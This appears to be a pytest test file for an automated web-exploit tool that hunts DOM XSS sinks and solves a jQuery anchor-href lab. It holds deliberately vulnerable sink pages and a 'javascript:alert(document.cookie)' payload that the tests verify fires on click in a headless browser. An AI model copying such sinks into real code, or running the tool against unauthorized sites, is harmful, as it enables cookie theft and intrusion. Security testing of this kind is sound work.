"""1.16.0 solve tests: DOM-flow hunt across crawled pages + javascript: anchor clicks.

Covers the jQuery-href lab shape ("DOM XSS in jQuery anchor href attribute
sink using location.search source"): the sink lives on an INNER page
(/feedback), nothing reflects server-side, and the payload only executes
when the poisoned anchor is CLICKED.

Offline tests reuse the FakeClient pattern from test_xss_exploit (no
network); the last test drives a real headless Chromium against a local
sink page and skips gracefully when no browser is installed.
"""

from __future__ import annotations

import asyncio
import socket
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlsplit

import pytest

from bughound.http_client import Response
from bughound.models import ScanConfig, ScanResult
from bughound.modules.base import ScanContext, Target

from tests.test_xss_exploit import FakeClient

LAB = "https://lab0adf000b03.web-security-academy.net"

HOME = (
    "<html><head><title>blog</title></head><body>"
    '<a href="/feedback?returnPath=/">Submit feedback</a>'
    "</body></html>"
)
POST = "<html><body><h1>post</h1></body></html>"
FEEDBACK_SINK = """
<a id=backLink>Back</a>
<script src="/resources/js/jquery_1-8-2.js"></script>
<script>
$('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
</script>"""

SEED_JQUERY_HREF = """
<div id="academyLabHeader"><section class='academyLabBanner'><div class=container>
<div class=title-container><h2>DOM XSS in jQuery anchor <code>href</code> attribute sink using <code>location.search</code> source</h2></div>
<div class='widgetcontainer-lab-status is-notsolved'><span>LAB</span><p>Not solved</p></div>
</div></section></div>
"""


def _handler(method, url, params, data, headers=None):
    path = urlsplit(url).path
    if path == "/feedback":
        return Response(url=url, status=200, headers={}, text=FEEDBACK_SINK, elapsed=0.01)
    if path == "/post":
        return Response(url=url, status=200, headers={}, text=POST, elapsed=0.01)
    return Response(url=url, status=200, headers={}, text=HOME, elapsed=0.01)


def _ctx(urls=None, seed_html=""):
    config = ScanConfig(target_url=LAB + "/", aggressive=True, exploit=True)
    target = Target(url=LAB + "/", scheme="https",
                    host="lab0adf000b03.web-security-academy.net",
                    port=443, authorized=True)
    return ScanContext(
        client=FakeClient(_handler), config=config, target=target, base_url=LAB + "/",
        urls=urls or [LAB + "/", LAB + "/post?postId=1", LAB + "/feedback?returnPath=/"],
        request_targets=[], seed_html=seed_html,
    )


# ---------------------------------------------------------------------------
# hunt_dom_flow_target
# ---------------------------------------------------------------------------


def test_hunt_finds_inner_sink_page():
    from bughound.exploits.xss import hunt_dom_flow_target

    ctx = _ctx()
    hit = asyncio.run(hunt_dom_flow_target(ctx))
    assert hit is not None, "hunt must locate the /feedback sink page"
    rt, param = hit
    assert rt.url == LAB + "/feedback?returnPath=/"
    assert param == "returnPath"
    assert rt.source == "dom-flow-hunt"


def test_hunt_returns_none_without_flows():
    from bughound.exploits.xss import hunt_dom_flow_target

    def flat(method, url, params, data, headers=None):
        return Response(url=url, status=200, headers={},
                        text="<html><body>plain page</body></html>", elapsed=0.01)

    config = ScanConfig(target_url=LAB + "/", aggressive=True, exploit=True)
    target = Target(url=LAB + "/", scheme="https", host="lab0adf000b03.web-security-academy.net",
                    port=443, authorized=True)
    ctx = ScanContext(client=FakeClient(flat), config=config, target=target,
                      base_url=LAB + "/", urls=[LAB + "/", LAB + "/a"], seed_html="")
    assert asyncio.run(hunt_dom_flow_target(ctx)) is None


def test_hunt_skips_foreign_origins():
    from bughound.exploits.xss import hunt_dom_flow_target

    ctx = _ctx(urls=[
        "https://evil.example.net/feedback?returnPath=/",
        LAB + "/",
        LAB + "/feedback?returnPath=/",
    ])
    hit = asyncio.run(hunt_dom_flow_target(ctx))
    # the foreign-origin sink page must never be contacted; the hit comes
    # from the lab's own /feedback page
    assert hit is not None
    assert hit[0].url.startswith(LAB)
    assert all("evil.example.net" not in req[1] for req in ctx.client.requests)


# ---------------------------------------------------------------------------
# solve-phase fallback: no XSS finding + no search-like target -> hunt drives
# the sink page through the title-driven class playbooks.
# ---------------------------------------------------------------------------


def test_solve_fallback_hunts_and_exploits_sink_page():
    from bughound.objectives import SolveBudget, strategy_xss_class_playbooks

    ctx = _ctx(seed_html=SEED_JQUERY_HREF)
    result = ScanResult(target=ctx.target, config=ctx.config)
    lines: list[str] = []
    notes = asyncio.run(strategy_xss_class_playbooks(
        ctx, result, lines.append, SolveBudget(max_requests=60)))

    assert "DOM-flow hunt locked the sink page" in "\n".join(lines)
    assert "returnPath" in notes
    assert "succeeded" in notes, f"expected a client-side success, got: {notes}"
    # official payload shape for the jQuery-href lab family
    assert "javascript:alert(document.cookie)" in notes.replace("%3A", ":").replace(
        "%28", "(").replace("%29", ")")


# ---------------------------------------------------------------------------
# REAL browser contract: javascript: hrefs must be CLICKED (they never fire
# on page load). Skips gracefully when Playwright/Chromium is missing.
# ---------------------------------------------------------------------------

CLICK_PAGE = """<html><body>
<a id="backLink">Back</a>
<script>
function $(sel){ return { attr: function(name, value){
    var el = document.querySelector(sel);
    if (el && value !== null && value !== undefined) el.setAttribute(name, value);
    return this; } }; }
$('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
</script></body></html>"""


class _ClickHandler(BaseHTTPRequestHandler):
    def do_GET(self):  # noqa: N802
        body = CLICK_PAGE.encode()
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *a):  # silence
        pass


def _free_port() -> int:
    with socket.socket() as s:
        s.bind(("127.0.0.1", 0))
        return s.getsockname()[1]


def test_browser_clicks_javascript_anchor_real():
    from bughound import browser_exec

    pytest.importorskip("playwright")
    ok, _hint = browser_exec.browser_available()
    if not ok:
        pytest.skip("no headless Chromium available")

    port = _free_port()
    srv = HTTPServer(("127.0.0.1", port), _ClickHandler)
    t = threading.Thread(target=srv.serve_forever, daemon=True)
    t.start()
    try:
        poc = f"http://127.0.0.1:{port}/feedback?returnPath=javascript:alert(document.cookie)"
        res = browser_exec.execute_sync(poc, timeout_s=20.0)
        assert res.ok
        assert res.executed, f"dialog must fire after the click phase (error: {res.error})"
        assert res.dialogs[0]["type"] == "alert"
        assert res.clicked_hrefs, "the clicked javascript: href must be recorded"
        assert any("alert(document.cookie)" in h for h in res.clicked_hrefs)
    finally:
        srv.shutdown()


# ---------------------------------------------------------------------------
# 1.17.0 real-lab fixes:
#   (a) source->sink adjacency -- the Academy's REAL labHeader.js ships on
#       every lab page with a WebSocket-fed innerHTML sink and NO DOM source;
#       it must not fabricate a flow (it hijacked the hunt on real instances).
#   (b) the hunt prefers flows with an explicit parameter name.
#   (c) the browser click phase waits for the poisoned href to EXIST (jQuery
#       applies it in a document-ready callback that can fire after load).
# ---------------------------------------------------------------------------

REAL_LABHEADER_JS = """
completedListeners = [];
(function () {
    let labHeaderWebSocket = undefined;
    function openWebSocket() {
        return new Promise(res => {
            let newWebSocket = new WebSocket(location.origin.replace("http", "ws") + "/academyLabHeader");
            newWebSocket.onmessage = function (evt) {
                const labSolved = document.getElementById('notification-labsolved');
                const keepAliveMsg = evt.data === 'PONG';
                if (labSolved || keepAliveMsg) { return; }
                document.getElementById("academyLabHeader").innerHTML = evt.data;
                animateLabHeader();
                for (const listener of completedListeners) { listener(); }
            };
        });
    }
    labHeaderWebSocket = openWebSocket();
})();
"""


def test_adjacency_rejects_sourceless_header_sink():
    from bughound.exploits.xss_recon import analyze_dom_flows

    # the real header script: innerHTML sink, NO location.search/hash source
    assert analyze_dom_flows("<div id=academyLabHeader></div>",
                             [("/resources/labheader/js/labHeader.js", REAL_LABHEADER_JS)]) == []
    # the real sink page (source + sink in the same body) must still yield the flow
    flows = analyze_dom_flows(FEEDBACK_SINK, [("/resources/labheader/js/labHeader.js", REAL_LABHEADER_JS)])
    assert any(f.sink == "jquery-attr" and f.param_hint == "returnPath" for f in flows)


def test_hunt_prefers_explicit_param_flow():
    from bughound.exploits.xss import hunt_dom_flow_target

    paramless = ("<div id=out></div><script>"
                 "document.getElementById('out').innerHTML = location.search.substr(1);"
                 "</script>")

    def handler(method, url, params, data, headers=None):
        path = urlsplit(url).path
        if path == "/a":
            return Response(url=url, status=200, headers={}, text=paramless, elapsed=0.01)
        if path == "/feedback":
            return Response(url=url, status=200, headers={}, text=FEEDBACK_SINK, elapsed=0.01)
        return Response(url=url, status=200, headers={}, text=HOME, elapsed=0.01)

    ctx = _ctx(urls=[LAB + "/a", LAB + "/feedback?returnPath=/"])
    ctx.client = FakeClient(handler)
    hit = asyncio.run(hunt_dom_flow_target(ctx))
    assert hit is not None
    rt, param = hit
    # the param-less /a flow (param would default to 'search') must NOT shadow
    # the real sink page with its explicit 'returnPath' parameter
    assert rt.url == LAB + "/feedback?returnPath=/"
    assert param == "returnPath"


DELAYED_CLICK_PAGE = """<html><body>
<a id="backLink">Back</a>
<script>
setTimeout(function () {
    document.getElementById('backLink').setAttribute(
        'href', (new URLSearchParams(window.location.search)).get('returnPath'));
}, 2500);
</script></body></html>"""


class _DelayedClickHandler(_ClickHandler):
    def do_GET(self):  # noqa: N802
        body = DELAYED_CLICK_PAGE.encode()
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)


def test_browser_waits_for_delayed_attr_real():
    """The real lab applies the href in a document-ready callback AFTER load;
    the click phase must WAIT for the poisoned href instead of racing a fixed
    settle (2.5 s delay > the 1.2 s settle the old code relied on)."""
    from bughound import browser_exec

    pytest.importorskip("playwright")
    ok, _hint = browser_exec.browser_available()
    if not ok:
        pytest.skip("no headless Chromium available")

    port = _free_port()
    srv = HTTPServer(("127.0.0.1", port), _DelayedClickHandler)
    t = threading.Thread(target=srv.serve_forever, daemon=True)
    t.start()
    try:
        poc = f"http://127.0.0.1:{port}/feedback?returnPath=javascript:alert(document.cookie)"
        res = browser_exec.execute_sync(poc, timeout_s=25.0)
        assert res.ok
        assert res.executed, (
            "dialog must fire even when the anchor href is applied after load "
            f"(error: {res.error})"
        )
        assert res.clicked_hrefs, "the clicked javascript: href must be recorded"
    finally:
        srv.shutdown()
